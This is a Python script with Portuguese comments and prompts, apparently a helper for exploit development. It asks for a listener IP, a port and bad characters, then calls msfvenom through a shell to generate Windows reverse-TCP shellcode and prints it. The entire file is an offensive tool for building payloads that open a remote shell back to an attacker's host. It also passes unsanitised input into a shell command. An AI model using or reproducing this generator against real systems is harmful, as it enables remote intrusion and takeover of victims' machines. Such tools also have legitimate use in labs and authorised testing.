import subprocess
import time
import os

def create_shellcode(lhost, lport, badchar):
    # Comando para criar o payload com msfvenom
    command = (
        f'msfvenom -p windows/shell_reverse_tcp LHOST={lhost} LPORT={lport} '
        f'EXITFUNC=thread -b "{badchar}" -f python'
    )
    print("\n[+] Executando o comando:")
    print(command)
    
    # Executa o comando usando subprocess
    process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    output, error = process.communicate()

    # Retorna o resultado ou erro
    if process.returncode == 0:
        return output.decode('utf-8')
    else:
        return error.decode('utf-8')

def print_banner():
    print("*" * 50)
    print("      Bem-vindo ao Criador de Shellcode")
    print("*" * 50)

def clear_screen():
    if os.name == 'nt':
        os.system('cls')
    else:
        os.system('clear')

def loading_animation():
    print("Criando payload...", end="")
    for _ in range(3):
        for char in ['/', '-', '\\', '|']:
            print(f"\b{char}", end="", flush=True)
            time.sleep(0.1)
    print("\b ", end="")

def main():
    clear_screen()
    print_banner()
    
    # Solicitar informações ao usuário
    lhost = input("\nDigite o valor para LHOST (IP da máquina local): ")
    lport = input("Digite o valor para LPORT (Porta): ")
    badchar = input("Digite o valor para Badchars (ex: \\x00): ")
    
    # Validar entrada de badchar
    if not badchar.startswith("\\x"):
        print("[!] Formato inválido para badchars. Exemplo correto: \\x00")
        return
    
    clear_screen()
    print("[+] Iniciando a criação do shellcode...")
    loading_animation()
    
    # Criar o shellcode usando o msfvenom
    shellcode = create_shellcode(lhost, lport, badchar)
    
    # Limpar a tela e exibir o shellcode gerado
    clear_screen()
    print_banner()
    print("\n[+] Shellcode criado com sucesso:")
    print("\n" + "-" * 50)
    print(shellcode)
    print("-" * 50)

if __name__ == '__main__':
    main()
